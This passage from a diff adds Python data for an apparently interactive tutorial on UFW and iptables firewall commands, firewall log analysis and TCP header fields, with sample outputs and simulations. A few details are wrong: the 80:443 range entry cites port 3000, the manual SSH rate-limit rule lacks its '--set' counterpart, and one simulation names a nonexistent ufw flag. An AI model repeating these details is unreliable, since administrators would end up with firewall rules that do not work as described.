+                "simulation": [
+                    {"step": 1, "title": "Parse rule", "desc": "Extracts port + protocol", "from": "ufw", "to": "Parser", "data": "22/tcp", "color": "#3498db"},
+                    {"step": 2, "title": "Insert rule", "desc": "Adds to iptables INPUT chain", "from": "ufw", "to": "netfilter", "data": "ACCEPT tcp dport 22", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow 80/tcp",
+                "desc": "Allow HTTP",
+                "output": """Rule added
+Rule added (v6)""",
+                "scenario": "Opens HTTP port for a web server. Without this, nobody can reach your website.",
+                "simulation": [
+                    {"step": 1, "title": "Add rule", "desc": "ACCEPT port 80", "from": "ufw", "to": "netfilter", "data": "ALLOW 80/tcp", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow 443/tcp",
+                "desc": "Allow HTTPS",
+                "output": """Rule added
+Rule added (v6)""",
+                "scenario": "Same as HTTP but for encrypted TLS traffic. Essential for any modern website.",
+                "simulation": [
+                    {"step": 1, "title": "Add rule", "desc": "ACCEPT port 443", "from": "ufw", "to": "netfilter", "data": "ALLOW 443/tcp", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow 3306/tcp",
+                "desc": "Allow MySQL (use with caution!)",
+                "output": """Rule added
+Rule added (v6)""",
+                "scenario": "⚠️ DANGEROUS if allowed from 'Anywhere'. A MySQL port exposed to the internet is a top target for brute force. Always pair with 'from <trusted-ip>'.",
+                "simulation": [
+                    {"step": 1, "title": "Open port", "desc": "ACCEPT 3306 from all", "from": "ufw", "to": "netfilter", "data": "ALLOW 3306/tcp", "color": "#e74c3c"},
+                    {"step": 2, "title": "Warning", "desc": "Anyone can now try MySQL login", "from": "netfilter", "to": "Warning", "data": "⚠️ Exposed!", "color": "#c0392b"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow from 192.168.1.0/24",
+                "desc": "Allow entire subnet",
+                "output": """Rule added""",
+                "scenario": "Allows ALL ports and protocols from every device on 192.168.1.0/24 (your LAN). Common for trusted internal networks.",
+                "simulation": [
+                    {"step": 1, "title": "Parse CIDR", "desc": "Expands subnet to range", "from": "ufw", "to": "Parser", "data": "192.168.1.0 - 192.168.1.255", "color": "#3498db"},
+                    {"step": 2, "title": "Add rule", "desc": "ACCEPT from subnet", "from": "ufw", "to": "netfilter", "data": "src 192.168.1.0/24", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow from 192.168.1.50 to any port 22",
+                "desc": "SSH only from specific IP",
+                "output": """Rule added""",
+                "scenario": "The most secure way to allow SSH: only your home/office IP can connect. Even if attackers know your password, they can't reach the login.",
+                "simulation": [
+                    {"step": 1, "title": "Match source", "desc": "Only from 192.168.1.50", "from": "netfilter", "to": "Rule", "data": "src == 192.168.1.50", "color": "#3498db"},
+                    {"step": 2, "title": "Match dest", "desc": "Any destination, port 22", "from": "netfilter", "to": "Rule", "data": "dport == 22", "color": "#f39c12"},
+                    {"step": 3, "title": "Allow", "desc": "If both match → ACCEPT", "from": "netfilter", "to": "Packet", "data": "PASS", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw deny from 203.0.113.5",
+                "desc": "Block a specific attacker",
+                "output": """Rule added""",
+                "scenario": "Instant response to an active attack. All traffic from this IP is dropped immediately — no ACK, no error, just silence.",
+                "simulation": [
+                    {"step": 1, "title": "Attacker sends packet", "desc": "203.0.113.5 → your server", "from": "Attacker", "to": "Firewall", "data": "SYN", "color": "#e74c3c"},
+                    {"step": 2, "title": "Rule matches", "desc": "DENY rule for this IP", "from": "Firewall", "to": "Rule Engine", "data": "MATCH deny", "color": "#f39c12"},
+                    {"step": 3, "title": "Drop", "desc": "Silent discard — attacker sees timeout", "from": "Firewall", "to": "Attacker", "data": "(no response)", "color": "#c0392b"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw delete allow 80/tcp",
+                "desc": "Remove a rule",
+                "output": """Rule deleted
+Rule deleted (v6)""",
+                "scenario": "Removes the HTTP rule. Any inbound request to port 80 is now blocked by the default deny policy.",
+                "simulation": [
+                    {"step": 1, "title": "Find rule", "desc": "Locates 'allow 80/tcp'", "from": "ufw", "to": "Rules DB", "data": "Found", "color": "#3498db"},
+                    {"step": 2, "title": "Remove", "desc": "Deletes from iptables", "from": "ufw", "to": "netfilter", "data": "iptables -D", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw status numbered",
+                "desc": "List rules with numbers",
+                "output": """Status: active
+
+     To                         Action      From
+     --                         ------      ----
+[ 1] 22/tcp                     ALLOW IN    Anywhere
+[ 2] 80/tcp                     ALLOW IN    Anywhere
+[ 3] 443/tcp                    ALLOW IN    Anywhere
+[ 4] Anywhere                   DENY IN     203.0.113.5
+[ 5] 22/tcp (v6)                ALLOW IN    Anywhere (v6)""",
+                "scenario": "Shows rule numbers so you can delete by index: 'sudo ufw delete 3'. Useful when rule text is complex.",
+                "simulation": [
+                    {"step": 1, "title": "Read all rules", "desc": "ufw -L --numbered", "from": "ufw", "to": "iptables", "data": "List rules", "color": "#3498db"},
+                    {"step": 2, "title": "Number them", "desc": "Assigns sequential indices", "from": "ufw", "to": "Terminal", "data": "[1], [2], [3]...", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw delete 3",
+                "desc": "Delete rule by index number",
+                "output": """Deleting:
+ allow 443/tcp
+Proceed with operation (y|n)? y
+Rule deleted
+Rule deleted (v6)""",
+                "scenario": "Fastest way to delete a rule when you're not sure of the exact text. Confirms before deleting.",
+                "simulation": [
+                    {"step": 1, "title": "Lookup", "desc": "Map #3 to 'allow 443/tcp'", "from": "ufw", "to": "Rules DB", "data": "allow 443/tcp", "color": "#3498db"},
+                    {"step": 2, "title": "Confirm", "desc": "Asks user", "from": "ufw", "to": "User", "data": "y/n", "color": "#f39c12"},
+                    {"step": 3, "title": "Delete", "desc": "Removes from netfilter", "from": "ufw", "to": "iptables", "data": "Rule gone", "color": "#27ae60"}
+                ]
+            }
+        ],
+        "advanced": [
+            {
+                "cmd": "sudo ufw limit ssh",
+                "desc": "Rate-limit SSH — auto-block brute force",
+                "output": """Rule added
+Rule added (v6)""",
+                "scenario": "🌟 BEST PRACTICE. If an IP tries to connect more than 6 times in 30 seconds, UFW blocks it for 30 seconds. Simple, built-in brute-force protection.",
+                "simulation": [
+                    {"step": 1, "title": "Legit connection", "desc": "User connects to SSH", "from": "User", "to": "Firewall", "data": "Attempt 1", "color": "#27ae60"},
+                    {"step": 2, "title": "Attacker floods", "desc": "Same IP: 10 attempts in 5 seconds", "from": "Attacker", "to": "Firewall", "data": "Attempt 7, 8, 9...", "color": "#f39c12"},
+                    {"step": 3, "title": "Auto-block", "desc": "UFW adds temporary DROP", "from": "Firewall", "to": "Attacker", "data": "BLOCKED 30s", "color": "#c0392b"},
+                    {"step": 4, "title": "Timeout expiry", "desc": "After 30s, attacker can retry", "from": "Firewall", "to": "Rule", "data": "Ban lifted", "color": "#3498db"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw allow 80:443/tcp",
+                "desc": "Allow port range 80-443",
+                "output": """Rule added
+Rule added (v6)""",
+                "scenario": "Opens every port from 80 to 443. Useful when running multiple web services (e.g., 80, 3000, 443).",
+                "simulation": [
+                    {"step": 1, "title": "Parse range", "desc": "Expands 80:443", "from": "ufw", "to": "Parser", "data": "80,81,...,443", "color": "#3498db"},
+                    {"step": 2, "title": "Add rule", "desc": "Single iptables rule with :80-443", "from": "ufw", "to": "netfilter", "data": "dport 80:443 ACCEPT", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw logging on",
+                "desc": "Enable logging to /var/log/ufw.log",
+                "output": """Logging enabled""",
+                "scenario": "After enabling, every blocked/denied packet is logged. You can then watch live attacks with 'tail -f /var/log/ufw.log'.",
+                "simulation": [
+                    {"step": 1, "title": "Enable", "desc": "Sets LOGGING=on", "from": "ufw", "to": "Config", "data": "Logging: on", "color": "#3498db"},
+                    {"step": 2, "title": "Log packets", "desc": "Blocked traffic written to disk", "from": "netfilter", "to": "/var/log/ufw.log", "data": "UFW BLOCK entries", "color": "#f39c12"},
+                    {"step": 3, "title": "Monitor", "desc": "tail -f /var/log/ufw.log", "from": "Admin", "to": "Terminal", "data": "Live view", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw reload",
+                "desc": "Reload rules without restarting",
+                "output": """Firewall reloaded""",
+                "scenario": "Applies any manual edits to /etc/ufw/user.rules without a full restart. Fast and safe.",
+                "simulation": [
+                    {"step": 1, "title": "Re-read config", "desc": "Parses /etc/ufw/user.rules", "from": "ufw", "to": "Config", "data": "User rules", "color": "#3498db"},
+                    {"step": 2, "title": "Reapply", "desc": "Flushes and re-loads netfilter", "from": "ufw", "to": "iptables", "data": "Rules loaded", "color": "#27ae60"}
+                ]
+            }
+        ],
+        "emergency": [
+            {
+                "cmd": "sudo ufw disable",
+                "desc": "Emergency — turns off firewall",
+                "output": """Firewall stopped and disabled on system startup""",
+                "scenario": "🔴 USE ONLY IF LOCKED OUT. This immediately disables the firewall. You can now SSH back in and fix your rules. Re-enable ASAP after fixing.",
+                "simulation": [
+                    {"step": 1, "title": "Set policy accept", "desc": "Default becomes ACCEPT", "from": "ufw", "to": "netfilter", "data": "iptables -P INPUT ACCEPT", "color": "#e74c3c"},
+                    {"step": 2, "title": "Flush rules", "desc": "Removes all custom rules", "from": "ufw", "to": "netfilter", "data": "iptables -F", "color": "#c0392b"},
+                    {"step": 3, "title": "Log warning", "desc": "System is now unfiltered", "from": "ufw", "to": "/var/log/syslog", "data": "⚠️ Firewall OFF", "color": "#f39c12"}
+                ]
+            },
+            {
+                "cmd": "sudo ufw reset",
+                "desc": "Remove all rules — start fresh",
+                "output": """Resetting all rules to installed defaults. This may disrupt existing ssh connections. Proceed with operation (y|n)? y
+Backing up 'user.rules' to '/etc/ufw/user.rules.20240115_142345'
+Backing up 'before.rules' to '/etc/ufw/before.rules.20240115_142345'
+Backing up 'after.rules' to '/etc/ufw/after.rules.20240115_142345'
+Backing up 'user6.rules' to '/etc/ufw/user6.rules.20240115_142345'
+Backing up 'before6.rules' to '/etc/ufw/before6.rules.20240115_142345'
+Backing up 'after6.rules' to '/etc/ufw/after6.rules.20240115_142345'""",
+                "scenario": "Nuclear option. Wipes all custom rules, restores defaults, backs up the old rules with timestamps. Use when the rule set is too messy to fix.",
+                "simulation": [
+                    {"step": 1, "title": "Backup rules", "desc": "Saves current rules with timestamp", "from": "ufw", "to": "/etc/ufw/", "data": "user.rules.TIMESTAMP", "color": "#f39c12"},
+                    {"step": 2, "title": "Flush", "desc": "Removes all rules from netfilter", "from": "ufw", "to": "iptables", "data": "iptables -F", "color": "#e74c3c"},
+                    {"step": 3, "title": "Restore defaults", "desc": "Applies Ubuntu default rules", "from": "ufw", "to": "netfilter", "data": "Deny incoming", "color": "#3498db"},
+                    {"step": 4, "title": "Complete", "desc": "Firewall is like fresh install", "from": "ufw", "to": "System", "data": "Clean slate", "color": "#27ae60"}
+                ]
+            }
+        ]
+    },
+    "iptables_basics": {
+        "intro": "iptables is the underlying kernel firewall. UFW is a frontend. Use iptables when you need granular control or when UFW isn't available.",
+        "chains": [
+            {"name": "INPUT", "desc": "Traffic coming TO your machine", "example": "Inbound SSH, HTTP requests", "color": "#27ae60"},
+            {"name": "OUTPUT", "desc": "Traffic leaving YOUR machine", "example": "Your apt update, DNS queries", "color": "#3498db"},
+            {"name": "FORWARD", "desc": "Traffic passing THROUGH your machine", "example": "Routed packets (routers only)", "color": "#9b59b6"}
+        ],
+        "targets": [
+            {"name": "ACCEPT", "desc": "Let the packet through", "color": "#27ae60", "icon": "✅"},
+            {"name": "DROP", "desc": "Silently discard (no response)", "color": "#e74c3c", "icon": "🔇"},
+            {"name": "REJECT", "desc": "Discard + send error response", "color": "#e67e22", "icon": "🛑"},
+            {"name": "LOG", "desc": "Log to syslog but continue", "color": "#f39c12", "icon": "📝"}
+        ],
+        "common_rules": [
+            {
+                "cmd": "sudo iptables -L -n -v",
+                "desc": "List all rules with counters",
+                "output": """Chain INPUT (policy ACCEPT 1234 packets, 567890 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+  145 10860 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22
+   89  6234 ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80
+    3   180 DROP       tcp  --  *      *       203.0.113.5          0.0.0.0/0            tcp dpt:22
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+
+Chain OUTPUT (policy ACCEPT 8901 packets, 1023456 bytes)
+ pkts bytes target     prot opt in     out     source               destination""",
+                "scenario": "Shows every iptables rule with the number of packets it has matched. The packet counters help you see if a rule is actually being hit — great for debugging.",
+                "simulation": [
+                    {"step": 1, "title": "Read netfilter", "desc": "Kernel returns current rules + counters", "from": "iptables", "to": "Kernel", "data": "GetRules(INPUT)", "color": "#3498db"},
+                    {"step": 2, "title": "Format", "desc": "iptables formats as table", "from": "iptables", "to": "Terminal", "data": "Chain INPUT...", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+                "desc": "Allow SSH",
+                "output": """(no output — success is silent)""",
+                "scenario": "Appends (-A) to INPUT chain: if packet is TCP, dest port 22, jump (-j) to ACCEPT. No output = success (Unix philosophy).",
+                "simulation": [
+                    {"step": 1, "title": "Parse rule", "desc": "Builds rule structure", "from": "iptables", "to": "Parser", "data": "-A INPUT -p tcp --dport 22", "color": "#3498db"},
+                    {"step": 2, "title": "Insert to kernel", "desc": "Adds to netfilter INPUT chain", "from": "iptables", "to": "Kernel", "data": "Append rule", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -A INPUT -i lo -j ACCEPT",
+                "desc": "Allow loopback interface",
+                "output": """(no output — success is silent)""",
+                "scenario": "CRITICAL: loopback (127.0.0.1) is used by local services. Without this rule, everything that talks to itself (databases, web apps) breaks.",
+                "simulation": [
+                    {"step": 1, "title": "Add rule", "desc": "ACCEPT on interface 'lo'", "from": "iptables", "to": "Kernel", "data": "lo → ACCEPT", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
+                "desc": "Allow established connections",
+                "output": """(no output — success is silent)""",
+                "scenario": "MUST HAVE. Without this, reply packets from outgoing connections get blocked — you'd have no internet. State module tracks connections.",
+                "simulation": [
+                    {"step": 1, "title": "User's PC opens HTTP", "desc": "OUTPUT: SYN → web server", "from": "PC", "to": "Web Server", "data": "SYN", "color": "#3498db"},
+                    {"step": 2, "title": "Web server replies", "desc": "INPUT: SYN-ACK arrives", "from": "Web Server", "to": "Firewall", "data": "SYN-ACK", "color": "#f39c12"},
+                    {"step": 3, "title": "State match", "desc": "conntrack says 'established'", "from": "Firewall", "to": "Rule Engine", "data": "ESTABLISHED", "color": "#9b59b6"},
+                    {"step": 4, "title": "Allow", "desc": "Reply packet passes through", "from": "Rule Engine", "to": "PC", "data": "ACCEPT", "color": "#27ae60"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -P INPUT DROP",
+                "desc": "Default deny incoming",
+                "output": """(no output — success is silent)""",
+                "scenario": "Sets the INPUT chain policy to DROP. If a packet doesn't match any ALLOW rule, it's dropped. Make sure you added ALLOW rules FIRST, or you'll be locked out!",
+                "simulation": [
+                    {"step": 1, "title": "Set policy", "desc": "Changes default INPUT action", "from": "iptables", "to": "Kernel", "data": "Policy: DROP", "color": "#e74c3c"},
+                    {"step": 2, "title": "Unmatched packets", "desc": "Anything not explicitly allowed", "from": "Firewall", "to": "Void", "data": "Dropped", "color": "#c0392b"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -A INPUT -s 203.0.113.5 -j DROP",
+                "desc": "Block an IP",
+                "output": """(no output — success is silent)""",
+                "scenario": "Instantly blocks all traffic from 203.0.113.5. Attacker sees timeouts — no error, no rejection, just silence. Very effective against brute force.",
+                "simulation": [
+                    {"step": 1, "title": "Attacker sends SYN", "desc": "203.0.113.5 → your server", "from": "Attacker", "to": "Firewall", "data": "SYN dport 22", "color": "#e74c3c"},
+                    {"step": 2, "title": "Match DROP rule", "desc": "Source IP matches", "from": "Firewall", "to": "Rule Engine", "data": "src == 203.0.113.5", "color": "#f39c12"},
+                    {"step": 3, "title": "Silent drop", "desc": "No reply sent", "from": "Firewall", "to": "Attacker", "data": "(timeout)", "color": "#c0392b"},
+                    {"step": 4, "title": "Logged", "desc": "If LOG rule precedes", "from": "Firewall", "to": "/var/log/kern.log", "data": "IN=eth0 SRC=203.0.113.5", "color": "#3498db"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP",
+                "desc": "Rate-limit SSH (manual)",
+                "output": """(no output — success is silent)""",
+                "scenario": "Advanced: blocks any IP that makes more than 4 new SSH connections in 60 seconds. Equivalent to UFW's 'limit ssh' but built manually.",
+                "simulation": [
+                    {"step": 1, "title": "Connection 1", "desc": "Track IP in 'recent' list", "from": "User", "to": "recent", "data": "192.168.1.5 (1)", "color": "#27ae60"},
+                    {"step": 2, "title": "Connections 2-3", "desc": "Still under threshold", "from": "User", "to": "recent", "data": "192.168.1.5 (3)", "color": "#f39c12"},
+                    {"step": 3, "title": "Connection 4", "desc": "Hit threshold", "from": "recent", "to": "Rule", "data": "192.168.1.5 (4)", "color": "#e74c3c"},
+                    {"step": 4, "title": "Block", "desc": "Next connections dropped for 60s", "from": "Rule", "to": "Attacker", "data": "DROP", "color": "#c0392b"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -A INPUT -j LOG --log-prefix 'IPT-DROP: '",
+                "desc": "Log dropped packets",
+                "output": """(no output — success is silent)""",
+                "scenario": "Must be placed BEFORE the DROP rules so packets get logged before being dropped. Logs go to /var/log/kern.log with the IPT-DROP prefix.",
+                "simulation": [
+                    {"step": 1, "title": "Packet arrives", "desc": "Matches no ALLOW rule", "from": "Network", "to": "Firewall", "data": "Unknown packet", "color": "#3498db"},
+                    {"step": 2, "title": "Log rule matches", "desc": "Writes to kern.log", "from": "Firewall", "to": "/var/log/kern.log", "data": "IPT-DROP: ...", "color": "#f39c12"},
+                    {"step": 3, "title": "Continue", "desc": "Then DROP rule fires", "from": "Firewall", "to": "Void", "data": "Dropped", "color": "#c0392b"}
+                ]
+            },
+            {
+                "cmd": "sudo iptables -F",
+                "desc": "Flush all rules (DANGEROUS!)",
+                "output": """(no output — success is silent)""",
+                "scenario": "⚠️ Removes every rule in every chain. If you're on a remote server, you'll be COMPLETELY EXPOSED until you reapply rules. Only run in controlled environments or with a fallback plan.",
+                "simulation": [
+                    {"step": 1, "title": "Clear chain", "desc": "Removes all rules in INPUT", "from": "iptables", "to": "Kernel", "data": "Flush INPUT", "color": "#e74c3c"},
+                    {"step": 2, "title": "Repeat", "desc": "OUTPUT, FORWARD too", "from": "iptables", "to": "Kernel", "data": "Flush all", "color": "#c0392b"},
+                    {"step": 3, "title": "Exposed", "desc": "Only chain policies remain", "from": "Kernel", "to": "Network", "data": "⚠️ No filtering", "color": "#f39c12"}
+                ]
+            },
+            {
+                "cmd": "sudo netfilter-persistent save",
+                "desc": "Persist rules across reboot (Debian)",
+                "output": """run-parts: executing /usr/share/netfilter-persistent/plugins.d/15-ip4tables save
+run-parts: executing /usr/share/netfilter-persistent/plugins.d/25-ip6tables save""",
+                "scenario": "iptables rules are lost on reboot. This saves them to /etc/iptables/rules.v4 so they auto-reload at boot.",
+                "simulation": [
+                    {"step": 1, "title": "Dump rules", "desc": "iptables-save dumps all rules", "from": "netfilter-persistent", "to": "iptables", "data": "iptables-save", "color": "#3498db"},
+                    {"step": 2, "title": "Write to disk", "desc": "Saves to /etc/iptables/", "from": "netfilter-persistent", "to": "/etc/iptables/rules.v4", "data": "File written", "color": "#27ae60"},
+                    {"step": 3, "title": "Enable service", "desc": "Auto-load on next boot", "from": "systemd", "to": "netfilter-persistent", "data": "systemctl enable", "color": "#9b59b6"}
+                ]
+            },
+            {
+                "cmd": "sudo service iptables save",
+                "desc": "Persist on RHEL/CentOS",
+                "output": """iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]""",
+                "scenario": "RHEL/CentOS equivalent of netfilter-persistent. Writes rules to /etc/sysconfig/iptables.",
+                "simulation": [
+                    {"step": 1, "title": "Dump rules", "desc": "iptables-save output", "from": "service", "to": "iptables", "data": "iptables-save", "color": "#3498db"},
+                    {"step": 2, "title": "Write", "desc": "Saves to /etc/sysconfig/iptables", "from": "service", "to": "Disk", "data": "File written", "color": "#27ae60"}
+                ]
+            }
+        ]
+    },
+    "firewall_logs": {
+        "location": "/var/log/ufw.log (UFW) or /var/log/kern.log or /var/log/syslog (iptables)",
+        "read": "sudo tail -f /var/log/ufw.log",
+        "sample": """Jan 15 14:23:45 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=203.0.113.5 DST=192.168.1.10 LEN=60 TOS=0x00 PREC=0x00 TTL=52 ID=54321 DF PROTO=TCP SPT=51234 DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0
+Jan 15 14:23:47 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=198.51.100.42 DST=192.168.1.10 LEN=40 TOS=0x00 PREC=0x00 TTL=52 ID=12345 DF PROTO=TCP SPT=54321 DPT=3306 WINDOW=1024 RES=0x00 SYN URGP=0""",
+        "analysis": [
+            "SRC = source IP (attacker)",
+            "DPT = destination port (what they're trying to reach)",
+            "PROTO = TCP/UDP",
+            "SYN = connection attempt (not response)",
+            "Multiple BLOCK entries from same SRC = ongoing attack"
+        ],
+        "detection_commands": [
+            {"cmd": "sudo grep 'UFW BLOCK' /var/log/ufw.log | awk '{print $13}' | sort | uniq -c | sort -rn | head", "desc": "Top 10 blocked source IPs"},
+            {"cmd": "sudo grep 'UFW BLOCK' /var/log/ufw.log | awk '{print $NF}' | sort | uniq -c | sort -rn", "desc": "Which ports are being targeted"},
+            {"cmd": "sudo tail -f /var/log/ufw.log | grep --line-buffered 'DPT=22'", "desc": "Live view of SSH attacks"}
+        ]
+    }
+}
+
+# ==================== TCP/UDP SEGMENT FIELD DATA ====================
+TCP_SEGMENT_FIELDS = [
+    {
+        "id": "src_port",
+        "name": "Source Port",
+        "size": "16 bits (2 bytes)",
+        "color": "#3498db",
+        "purpose": "Identifies the sending application/process on the source device.",
+        "details": [
+            "Range: 0–65535",
+            "Client uses ephemeral port (typically 49152–65535)",
+            "Tells the server which application sent the request so the reply goes back to the right place"
+        ],
+        "example": "Your browser uses source port 54321 when connecting to google.com",
+        "real_output": """$ netstat -tn | grep ESTABLISHED
+tcp  0  0 192.168.1.10:54321   142.250.185.78:443   ESTABLISHED
+
+Local Address          Foreign Address
+192.168.1.10:54321  →  142.250.185.78:443
+     ↑                          ↑
+  SRC PORT 54321           DST PORT 443""",
+        "scenario": "Every outbound connection picks a random high port as the source. This is how the OS knows which browser tab should receive the reply.",
+        "simulation": [
+            {"step": 1, "title": "Browser initiates", "desc": "Chrome wants to fetch google.com", "from": "Chrome", "to": "OS", "data": "Request socket", "color": "#3498db"},
+            {"step": 2, "title": "OS allocates port", "desc": "Kernel picks an unused ephemeral port", "from": "OS", "to": "TCP Stack", "data": "Port 54321", "color": "#f39c12"},
+            {"step": 3, "title": "Packet built", "desc": "Source port 54321 is stamped in the header", "from": "TCP Stack", "to": "Network", "data": "SRC=54321", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "dst_port",
+        "name": "Destination Port",
+        "size": "16 bits (2 bytes)",
+        "color": "#27ae60",
+        "purpose": "Identifies the target application/service on the destination device.",
+        "details": [
+            "Range: 0–65535",
+            "Well-known services use fixed ports (80=HTTP, 443=HTTPS, 22=SSH)",
+            "Tells the receiver's OS which application should handle the packet"
+        ],
+        "example": "Connecting to a web server always uses destination port 443 (HTTPS)",
+        "real_output": """$ netstat -tn | grep ESTABLISHED
+tcp  0  0 192.168.1.10:54321   142.250.185.78:443   ESTABLISHED
+                                        ↑
+                                    DST PORT 443 (HTTPS)
+
+Port 443 → Web server's HTTPS listener picks up the packet
+Port 22  → SSH daemon would handle it
+Port 3306 → MySQL would handle it""",
+        "scenario": "The destination port is a promise: 'If you send to port 443, the web server will answer.' Firewalls often block by destination port.",
+        "simulation": [
+            {"step": 1, "title": "User types URL", "desc": "Browser resolves https://google.com", "from": "User", "to": "Browser", "data": "Need port 443", "color": "#3498db"},
+            {"step": 2, "title": "Destination set", "desc": "TCP header marks DST=443", "from": "Browser", "to": "TCP Stack", "data": "DST=443", "color": "#f39c12"},
+            {"step": 3, "title": "Server receives", "desc": "Google's server routes to HTTPS process", "from": "Network", "to": "nginx", "data": "443 → nginx", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "seq_num",
+        "name": "Sequence Number",
+        "size": "32 bits (4 bytes)",
+        "color": "#9b59b6",
+        "purpose": "Tracks the byte order of data so the receiver can reassemble it correctly — even if packets arrive out of order.",
+        "details": [
+            "Range: 0 to 4,294,967,295",
+            "Initial sequence is random (for security — prevents prediction attacks)",
+            "Every byte of data increments the sequence number",
+            "Receiver reorders out-of-order packets using these numbers"
+        ],
+        "example": "If you send 1000 bytes, the next segment's Seq starts at previous Seq + 1000",
+        "real_output": """$ tcpdump -nn -i eth0 port 443
+14:23:45.123 IP 192.168.1.10.54321 > 142.250.185.78.443:
+  Flags [S], seq 1000000000, win 64240
+
+14:23:45.234 IP 142.250.185.78.443 > 192.168.1.10.54321:
+  Flags [S.], seq 3000000000, ack 1000000001, win 65535
+
+14:23:45.345 IP 192.168.1.10.54321 > 142.250.185.78.443:
+  Flags [.], ack 1, win 64240
+
+Next data packet:
+14:23:45.456 IP 192.168.1.10.54321 > 142.250.185.78.443:
+  Flags [P.], seq 1000000001, ack 3000000001, length 517""",
+        "scenario": "Networks reorder packets all the time. Sequence numbers let TCP put Humpty Dumpty back together — even if segment #5 arrives before #3.",
+        "simulation": [
+            {"step": 1, "title": "App sends data", "desc": "1000 bytes to send", "from": "App", "to": "TCP", "data": "1000 bytes", "color": "#9b59b6"},
+            {"step": 2, "title": "Segment 1", "desc": "First 500 bytes labeled", "from": "TCP", "to": "Network", "data": "Seq=1, Len=500", "color": "#3498db"},
+            {"step": 3, "title": "Segment 2", "desc": "Next 500 bytes labeled", "from": "TCP", "to": "Network", "data": "Seq=501, Len=500", "color": "#f39c12"},
+            {"step": 4, "title": "Out-of-order arrival", "desc": "Segment 2 arrives first", "from": "Network", "to": "Receiver", "data": "Seq=501 first", "color": "#e74c3c"},
+            {"step": 5, "title": "Reassembled", "desc": "Receiver reorders using Seq", "from": "Receiver", "to": "App", "data": "Correct order", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "ack_num",
+        "name": "Acknowledgment Number",
+        "size": "32 bits (4 bytes)",
+        "color": "#e74c3c",
+        "purpose": "Tells the sender 'I've received everything up to byte N — send me N+1 next.'",
+        "details": [
+            "Only meaningful when the ACK flag is set",
+            "Always equals 'next expected byte' (not 'last received byte')",
+            "Cumulative — acknowledges all bytes up to N",
+            "Missing ACK → sender retransmits after timeout"
+        ],
+        "example": "Ack=1001 means 'I got bytes 1–1000, send me 1001 next'",
+        "real_output": """Sequence of packets:
+Packet 1: Seq=1000, Len=500  →  Receiver ACKs = 1500
+Packet 2: Seq=1500, Len=500  →  Receiver ACKs = 2000
+Packet 3: Seq=2000, Len=500  →  Receiver ACKs = 2500
+
+If packet 2 is lost:
+Packet 1: Seq=1000, Len=500  →  ACK=1500
+(timeout — no ACK for 1500)
+Sender retransmits: Seq=1500, Len=500  →  ACK=2000""",
+        "scenario": "TCP's 'reliability' is built on ACKs. Without them, there's no way to know if data arrived. Lost ACK = retransmission.",
+        "simulation": [
+            {"step": 1, "title": "Sender sends", "desc": "Bytes 1000-1499 sent", "from": "Sender", "to": "Receiver", "data": "Seq=1000", "color": "#3498db"},
+            {"step": 2, "title": "Receiver gets it", "desc": "All 500 bytes received OK", "from": "Receiver", "to": "App", "data": "Delivered", "color": "#27ae60"},
+            {"step": 3, "title": "ACK sent back", "desc": "Receiver says 'I want 1500 next'", "from": "Receiver", "to": "Sender", "data": "Ack=1500", "color": "#f39c12"},
+            {"step": 4, "title": "Sender continues", "desc": "Sends bytes 1500-1999", "from": "Sender", "to": "Receiver", "data": "Seq=1500", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "data_offset",
+        "name": "Data Offset (Header Length)",
+        "size": "4 bits",
+        "color": "#16a085",
+        "purpose": "Tells the receiver how many 32-bit words are in the header (so it knows where the actual data begins).",
+        "details": [
+            "Value × 4 = header length in bytes",
+            "Minimum value: 5 (5 × 4 = 20 bytes, no options)",
+            "Maximum value: 15 (15 × 4 = 60 bytes, with options)",
+            "When TCP Options are used, this value increases"
+        ],
+        "example": "Data Offset = 5 → 5 × 4 = 20-byte header (standard TCP, no options)",
+        "real_output": """Standard TCP segment (no options):
+Data Offset = 0101 (binary) = 5
+Header length = 5 × 4 = 20 bytes
+
+With options (e.g., MSS, Window Scaling):
+Data Offset = 1000 (binary) = 8
+Header length = 8 × 4 = 32 bytes
+
+Total segment size = Header + Data
+Example: 20 (header) + 1460 (data) = 1480 bytes on wire""",
+        "scenario": "The Data Offset field lets TCP headers be variable length. Extra options (like MSS, timestamps, SACK) go in the header — this field marks the boundary between header and data.",
+        "simulation": [
